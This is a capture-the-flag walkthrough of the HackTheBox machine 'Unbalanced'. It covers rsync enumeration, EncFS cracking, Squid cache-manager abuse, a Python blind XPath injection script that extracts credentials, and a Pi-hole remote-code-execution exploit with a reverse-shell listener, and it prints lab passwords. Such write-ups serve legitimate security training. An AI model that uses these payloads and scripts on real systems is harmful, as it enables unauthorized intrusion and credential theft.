---
title: "Unbalanced  HackTheBox Writeup"
last_modified_at: 2020-10-17T14:40:02-05:00
categories:
  - htb
author_profile: false
tags:
  - HTB
  - Linux
  - rsync
  - hydra
  - squidclient
  - pi-hole
  - docker
---

<script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="reddevil2020" data-description="Support me on Buy me a coffee!" data-message="Thank you for visiting. You can now buy me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>


![image](/assets/images/htb-boxes/unbalanced.png)

## Summary

*   Configuring FoxyProxy for proxy settings
*   Exploring rsync port and downloading encrypted files
*   Cracking the passphrase needed for EncFS and reading config files after decryption
*   Using squidclient for viewing information
*   Understanding xpath injection and extracting usernames and passwords
*   Port Forwarding and exploiting a known CVE for pi-hole.

Port Scan
---------

```console
$ nmap -sC -sV -oN unbalanced 10.10.10.200
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a2:76:5c:b0:88:6f:9e:62:e8:83:51:e7:cf:bf:2d:f2 (RSA)
|   256 d0:65:fb:f6:3e:11:b1:d6:e6:f7:5e:c0:15:0c:0a:77 (ECDSA)
|_  256 5e:2b:93:59:1d:49:28:8d:43:2c:c1:f7:e3:37:0f:83 (ED25519)
873/tcp  open  rsync?
3128/tcp open  http-proxy Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Looking at the result, we have ssh running on port 22, rsync on port 873 and squid proxy on port 3128.

Port 3128
---------

What is Squid ?

[Squid](http://www.squid-cache.org/) is a caching proxy for the Web supporting HTTP, HTTPS, FTP and more. It sits in between client and website and caches the frequently requested contents and serves them resulting in reduced bandwidth, network congestion and thus improving the response time.

Trying to access [http://10.10.10.200:3128](http://10.10.10.200:3128)

![1](/assets/images/unbalanced/1.png)

We get an **Invalid URL**. So,  lets add an entry on the foxyproxy, to access the URL through the proxy. FoxyProxy is a browser extension that lets you manage the proxy setting very easily.

![2](/assets/images/unbalanced/2.png)


Using Squid proxy:

![3](/assets/images/unbalanced/3.png)


Accessing [http://10.10.10.200](http://10.10.10.200) through proxy

![4](/assets/images/unbalanced/4.png)


This time we get a **ACCESS DENIED**.

Squid can be configured for authentication but there was no any pop up asking for username and password. Even if the pop up had come up, we didn't have a username and password.

**PORT 873 — RSYNC**

[Rsync](https://en.wikipedia.org/wiki/Rsync) is a utility for efficiently transferring and synchronizing files between a computer and an external hard drive and across networked computers by comparing the modification times and sizes of files.

Connecting to port 873

```console
$ nc -v 10.10.10.200 873
Connection to 10.10.10.200 873 port [tcp/rsync] succeeded!
@RSYNCD: 31.0      # server replying with version
@RSYNCD: 31.0      # we sent the same info
#list              # asking to list the content
conf_backups    EncFS-encrypted configuration backups
@RSYNCD: EXIT
```

There is a EncFS-encrypted configuration backups folder called conf\_backups. So let us download that folder to the local box.

We can use **rsync** to download the content. rsync can be installed from apt.

```console
$ apt install rsync
```

**Downloading the contents of conf\_backups folder**

```console
$ rsync -av rsync://10.10.10.200:873/conf_backups ./conf_backups                                                              
receiving incremental file list                                                         
created directory ./conf_backups
./                      
,CBjPJW4EGlcqwZW4nmVqBA6
-FjZ6-6,Fa,tMvlDsuVAO7ek                                                                
.encfs6.xml             
0K72OfkNRRx3-f0Y6eQKwnjn                                                                
27FonaNT2gnNc3voXuKWgEFP4sE9mxg0OZ96NB0x4OcLo-
.....
......
uEtPZwC2tjaQELJmnNRTCLYU
vCsXjR1qQmPO5g3P3kiFyO84
waEzfb8hYE47wHeslfs1MvYdVxqTtQ8XGshJssXMmvOsZLhtJWWRX31cBfhdVygrCV5
sent 1,452 bytes  received 411,990 bytes  25,057.09 bytes/sec
total size is 405,603  speedup is 0.98
```

This is an EncFS encrypted folder. EncFS is a Free (LGPL) FUSE-based cryptographic filesystem. It transparently encrypts files, using an arbitrary directory as storage for the encrypted files. To get a understanding of how files are encrypted, I suggest you to read [this article.](https://wiki.archlinux.org/index.php/EncFS)

So we have a EncFS encrypted directory and one interesting thing about EncFS is that it stores the encryption metadata information in a per-directory configuration file (`.encfs6.xml`), So that we do not have to remember anything (except the passphrase). And looking at the output above, we do have that file. So now we have to find the passphrase, which is used to encrypt the key in `.encfs6.xml` file.

Password Cracking using john
----------------------------

John The Ripper comes preinstalled in most penetration distros. You can install john from [here.](https://github.com/magnumripper/JohnTheRipper)

For this we will be using script in john called **encfs2john.py**.

```console
$ locate encfs2john  
/usr/share/john/encfs2john.py
```

Using the script to create the hash and saving on file hash.john

```console
$ ./encfs2john.py conf_backups/ | tee hash.john
conf_backups/:$encfs$192*580280*0*20*99176a6e4d96c0b32bad9d4feb3d8e425165f105*44*1b2a580dea6cda1aedd96d0b72f43de132b239f51c224852030dfe8892da2cad329edc006815a3e84b887add
```

**Cracking the hash with rockyou.txt wordlist.**

```console
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (EncFS [PBKDF2-SHA1 256/256 AVX2 8x AES])
Cost 1 (iteration count) is 580280 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
bubblegum        (conf_backups/)
1g 0:00:00:42 DONE (2020-08-13 06:44) 0.02335g/s 16.81p/s 16.81c/s 16.81C/s zacefron..marissa
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

And we get the password. So lets decrypt the files using **encfsctl**.

```console
$ encfsctl export conf_backups/ conf_backups_decrpyted
EncFS Password: bubblegum
directory conf_backups_decrpyted does not exist.
The directory "conf_backups_decrpyted" does not exist. Should it be created? (y,N) y
```

Looking inside the folder, we get bunch of configuration files.

![5](/assets/images/unbalanced/5.png)


By looking around, we can see the configuration file for squid ie. **squid.conf**.

### Interesting content inside squid.conf

```console
# Allow access to intranet
acl intranet dstdomain -n intranet.unbalanced.htb
acl intranet_net dst -n 172.16.0.0/12
http_access allow intranet
http_access allow intranet_net


# No password. Actions which require password are denied.
cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events
cachemgr_passwd disable all
```

Here, we find two intersting things. One is the hostname, which we will add on our _/etc/hosts_ file. Lets also add unbalanced.htb too just to be safe.

```console
10.10.10.200    unbalanced.htb intranet.unbalanced.htb
```

Second interesting thing is the entry of cache manager where we can see the password along with the actions allowed.

**Accessing intranet.unbalanced.htb through proxy**
---------------------------------------------------

![6](/assets/images/unbalanced/6.png)


We get a login form.

I tried basic SQL, NoSQL injection trying to bypass the login but got nothing.

```console
username=' or '1'='1&password=' or '1'='1     #sql injection
username[$ne]=toto&password[$ne]=toto         #no sql injection
```

By testing manually, it didn't look like it was vulnerable to SQL injection. Even though I copied the login request from burp and ran Sqlmap with the request file. However, I didn't get anything.

**Cache Manager**
-----------------

The cache manager is a component of Squid which provides management controls and reports displaying statistics about the _squid_ process as it runs.

And after reading the the [documentation](https://wiki.squid-cache.org/Features/CacheManager) about cache manager, I knew that we can access the manager reports using squidclient which is a command line utility and can be installed using apt.

```console
$ sudo apt install squidclient
```

Using squidclient for viewing information
-----------------------------------------

```console
$ squidclient -h 10.10.10.200 -p 3128 mgr:menu@Thah\$Sh1
HTTP/1.1 200 OK                                                                         
Server: squid/4.6                                                                       
Mime-Version: 1.0                                                                       
Date: Thu, 13 Aug 2020 11:56:15 GMT                                                     
Content-Type: text/plain;charset=utf-8                                                  
Expires: Thu, 13 Aug 2020 11:56:15 GMT                                                  
Last-Modified: Thu, 13 Aug 2020 11:56:15 GMT                            
X-Cache: MISS from unbalanced                                                           
X-Cache-Lookup: MISS from unbalanced:3128                                               
Via: 1.1 unbalanced (squid/4.6)                                                         
Connection: close                                                                       
                                                                                        
 index             Cache Manager Interface                 disabled
 menu              Cache Manager Menu                      protected
 ......
 ......
 sourcehash        peer sourcehash information             disabled
 server_list       Peer Cache Statistics                   disabled
```

And I was looking the options permitted for cache manager like menu, pconn, mem, diskd, fqdncacheand and so on that was mentioned on the squid.conf file. And on **fqdncache** option, I found a bunch of hostnames with ip addresses.

```console
$ squidclient -h 10.10.10.200 -p 3128 mgr:fqdncache@Thah\$Sh1 
```

![7](/assets/images/unbalanced/7.png)




These two entries looked interesting to me.

```console
172.31.179.2             H -001   1 intranet-host2.unbalanced.htb  
172.31.179.3             H -001   1 intranet-host3.unbalanced.htb
```

172.31.179.2 => intranet-host2.unbalanced.htb
---------------------------------------------

![8](/assets/images/unbalanced/8.png)


It looks like the same page that we had seen earlier. And I checked for SQL and NoSQL injection on this page, but I did not get anything.

172.31.179.3 => intranet-host3.unbalanced.htb
---------------------------------------------

![9](/assets/images/unbalanced/9.png)


This page looks exactly the same as the previous one. And I checked for SQL and NoSQL injection on this page too. But I didn't get anything.

Analyzing the pattern of the hosts
----------------------------------

```console
172.31.179.2          intranet-host2.unbalanced.htb  
172.31.179.3          intranet-host3.unbalanced.htb
```

Looking at the pattern, I realized there is likely to be a service at **172.31.179.1** with hostname **intranet-host1.unbalanced.htb**. Otherwise, why would anyone start the naming from host2? That seems logical, right?

172.31.179.1 => intranet-host1.unbalanced.htb
---------------------------------------------

![10](/assets/images/unbalanced/10.png)


And I was right. I tried the same SQL injection payload in this login form too. And third time the charm, we got something back.

![11](/assets/images/unbalanced/11.png)


![12](/assets/images/unbalanced/12.png)


And I played with it for a while. Tried many manual sql injections queries and used sqlmap by copying the login request from burpsuite but I did not get anything.

Then one of my friend on discord told me about xpath injection. At that time, I was completely unaware of XPath injection. So I read many articles that I could find regarding xpath injection but still, I was not able to exploit the vulnerability.

Then I thought of taking a step back and went to [xpather.com](http://xpather.com/) to play around with a XML example.

```xml
<?xml version="1.0" encoding="utf-8"?>
<Employees>
   <Employee ID="1">
      <FirstName>Arnold</FirstName>
      <LastName>Baker</LastName>
      <UserName>ABaker</UserName>
      <Password>SoSecret</Password>
      <Type>Admin</Type>
   </Employee>
   <Employee ID="2">
      <FirstName>Peter</FirstName>
      <LastName>Pan</LastName>
      <UserName>PPan</UserName>
      <Password>NotTelling</Password>
      <Type>User</Type>
   </Employee>
</Employees>
```

I used the above example to practice.

**Enumerating Root Element**

```python
1. /*                           # Gives the root node and everything on it.
2. name(/*)                     # Gives the name of the root node ie Employees.
3. string-length(name(/*))      # Gives the length of string Employees.ie 9
4. substring(name(/*)),1,1)     # Gives first character of Employees ie 'E'
```

Using this technique, now we can enumerate the root node’s name, it’s length as well as extract the root node name a character at a time.

**Enumerating First Child**

```python
1. /Employees/*                            # all the child of node Employees
2. /Employees/*[1]                         # Only first child of Employees
3. name(/Employees/*[1])                   # Gives Employee
4. string-length(name(/Employees/*[1]))    # Gives 8
5. substring(name(/Employees/*[1]),1,1)    # Gives 'E'
```

**Enumerating Next Child**

```python
1. /Employees/Employee[1]/*                                 # All info about first Employee
2. /Employees/Employee[1]/*[1]                              # FirstName
3. string-length(/Employees/Employee[1]/*[1])               # Gives 9
4. substring(name(/Employees/Employee[1]/*[1]),1,1) = 'F'   # True
```

**Enumerating the content**

```python
1. /Employees/Employee[1]/FirstName/text()                         # 'Arnold'
2. string-length(/Employees/Employee[1]/FirstName/text())          # 6
3. substring(/Employees/Employee[1]/FirstName/text(),1,1) = 'A'    # True
```

Now I think you get the gist. If you still have problem, I suggest you to go to [this link](http://xpather.com/) and get your hands dirty. Once you know how to walk through those elements, it is very much similar to SQL injection.

Writing a crappy code for extracting information.
-------------------------------------------------

Payload used:

```python
'or '1'='1' and substring(/Employees/Employee[3]/Password/text(),1,1) = 'A' and '1'='1
#Breaking the payload
# 1. ' or '1' = '1'                               # always true and returns the whole information
# 2. and substring(name(/*),1,1) = 'ch'           # only true when ch = required character
# 3. and '1' = '1                                 # always true and to make the query valid
```

If the condition is true, we get the response with all those names and emails. But if the condition is false, we don’t get any of those responses.

To extract the information of different elements, you can change the payload according to your needs.

**Code**

```python
#!/usr/bin/python3
import requests
from string import printable
url = "http://172.31.179.1/intranet.php"
proxy = {'http' : 'http://10.10.10.200:3128'}
str1  = printable
j = 1
out = ''
len1 = 0
#Finding length of the String
while True:
    params = { 'Username' : "'or '1'='1' and string-length(/Employees/Employee[3]/Username/text()) = "+str(j)+" and '1'='1",
            'Password' : "'or '1'='1' and string-length(/Employees/Employee[3]/Username/text()) =" +str(j)+" and '1'='1"
           }
    r = requests.post(url,data=params,proxies=proxy)
    #print("testing: "+ str(j),end='\r',flush=True)
    if 'Rita' in r.text:
        len1 = j 
        #print("value found finally: "+ str(j))
        break
    j += 1
#Extracting the  username value
username= ''
for i in range(1,len1+1):
    for ch in str1:
        #print("value testing for character number: "+str(i) + " and Value: " + ch,end = '\r', flush=True)
        params = { 'Username' : "'or '1'='1' and substring(/Employees/Employee[3]/Username/text(),{},1) = '".format(i)+ch +"' and '1'='1",
            'Password' : "'or '1'='1' and substring(/Employees/Employee[3]/Username/text(),{},1) = '".format(i) +ch+"' and '1'='1"
            }
        r = requests.post(url,data=params,proxies=proxy)
        if 'Rita' in r.text:
            username += ch
            print("Username: " + username,end='\r',flush=True)
            break
print("Username : " +username)
#string length of Password
while True:
    params = { 'Username' : "'or '1'='1' and string-length(/Employees/Employee[3]/Password/text()) = "+str(j)+" and '1'='1",
            'Password' : "'or '1'='1' and string-length(/Employees/Employee[3]/Password/text()) =" +str(j)+" and '1'='1"
           }
    r = requests.post(url,data=params,proxies=proxy)
    #print("testing: "+ str(j),end='\r',flush=True)
    if 'Rita' in r.text:
        len1 = j 
       # print("value found finally: "+ str(j))
        break
    j += 1
# Extracting the password
pass1= ''
for i in range(1,len1+1):
    for ch in str1:
        #print("value testing for character number: "+str(i) + " and Value: " + ch,end = '\r', flush=True)
        params = { 'Username' : "'or '1'='1' and substring(/Employees/Employee[3]/Password/text(),{},1) = '".format(i)+ch +"' and '1'='1",
            'Password' : "'or '1'='1' and substring(/Employees/Employee[3]/Password/text(),{},1) = '".format(i) +ch+"' and '1'='1"
            }
        r = requests.post(url,data=params,proxies=proxy)
        if 'Rita' in r.text:
            pass1 += ch
            print("password : " + pass1,end='\r',flush=True)
            break
print("password : " +pass1)
```

```console
#Extracted Information   
rita:password01!  
jim:stairwaytoheaven  
bryan:ireallyl0vebubblegum!!!  
sarah:sarah4evahevah
```

Port 22
-------

As ssh was open, I tried to log in with the usernames and their password. And we get in with Bryan’s password.

```console
$ ssh bryan@10.10.10.200
bryan@10.10.10.200's password: 
Linux unbalanced 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Aug 13 09:12:43 2020 from 10.10.14.167
bryan@unbalanced:~$
```

Reading User.txt
----------------

![13](/assets/images/unbalanced/13.png)


Privilege Escalation
--------------------

On Bryan’s home directory

![14](/assets/images/unbalanced/14.png)


Notes on pi-hole looks interesting.

Looking for the listening ports in the box.

![15](/assets/images/unbalanced/15.png)


We can see that ports 5553 and 8080 are open but we didn't see that on our Nmap scan as it was listening only on 127.0.0.1.

I didn't know what pi hole was used for. So I searched around and found that Pi-hole is a Linux network-level advertisement and Internet tracker blocking application which acts as a DNS sinkhole and optionally a DHCP server, intended for use on a private network.

And I checked if there are any known exploits for Pi-hole and I founded multiple exploits for pi-hole.

![16](/assets/images/unbalanced/16.png)


But we still did not know the version of the pi-hole but as there was the CVE of year 2020, there is a high possibility that this pi-hole might be vulnerable.

Anyway I search around and found a [great article](https://natedotred.wordpress.com/2020/03/28/cve-2020-8816-pi-hole-remote-code-execution/) explaining how the tampering of the field MAC address could lead to RCE. Also I found [this repo](https://github.com/AndreyRainchik/CVE-2020-8816) on GitHub exploiting these vulnerabilities to get the reverse shell. But this is an authenticated exploit, that means we must be logged in to perform this exploit.

Port Forwarding
---------------

As we can’t access the service running on port 8080, we use port forwarding.

```console
$ ssh -N -L 8000:127.0.0.1:8080 bryan@10.10.10.200
bryan@10.10.10.200's password:
```

Here, we listen on port 8000 on our local box and forward that traffic using ssh to the port 8080 on the remote box.

We can see that our box is now listening on port 8000.

```console
$ netstat -anlp | grep -i 8000

tcp      0    0 127.0.0.1:8000    0.0.0.0:*    LISTEN      27403/ssh           
tcp6     0    0 ::1:8000          :::*         LISTEN      27403/ssh
```

**Accessing Pi-hole Interface On our local machine**

![17](/assets/images/unbalanced/17.png)


We get some response.

Reading different articles and CVEs, I came to know that pi-hole has a admin interface on /admin/.

![1](/assets/images/unbalanced/1.png)


And I tried logging in with common passwords before trying to brute force the password. But luckily, I got in with a password as **admin**.

Now that we have successfully logged in, let us try the exploit from the GitHub that I mentioned earlier.

First we open a Netcat listener on port 9001

```console
$ nc -nvlp 9001  
Listening on [0.0.0.0] (family 2, port 9001)  
Listening on 0.0.0.0 9001
```

**Executing exploit**

![18](/assets/images/unbalanced/18.png)


And we get a shell as www-data.
![19](/assets/images/unbalanced/19.png)

As there was no python and python3 on the box, I didn't try getting a tty. I like to explore the box manually before running scripts like linpeas or LinEnum.

**On /root folder**

```console
$ ls /root
ph_install.sh
pihole_config.sh
```

These are the configuration file and install script for pihole. Looking inside the files, I found something interesting in pihole\_config.sh

```console
$ cat pihole_config.sh
#!/bin/bash
# Add domains to whitelist
/usr/local/bin/pihole -w unbalanced.htb
/usr/local/bin/pihole -w rebalanced.htb
# Set temperature unit to Celsius
/usr/local/bin/pihole -a -c
# Add local host record
/usr/local/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1
# Set privacy level
/usr/local/bin/pihole -a -l 4
# Set web admin interface password
/usr/local/bin/pihole -a -p 'bUbBl3gUm$43v3Ry0n3!'
# Set admin email
/usr/local/bin/pihole -a email admin@unbalanced.htb
```

Using the password that I found on pihole\_config.sh, I tried to su as root from Bryan.



And I got in and we get a root shell.

![20](/assets/images/unbalanced/20.png)


And finally we can get the root flag.
![21](/assets/images/unbalanced/21.png)
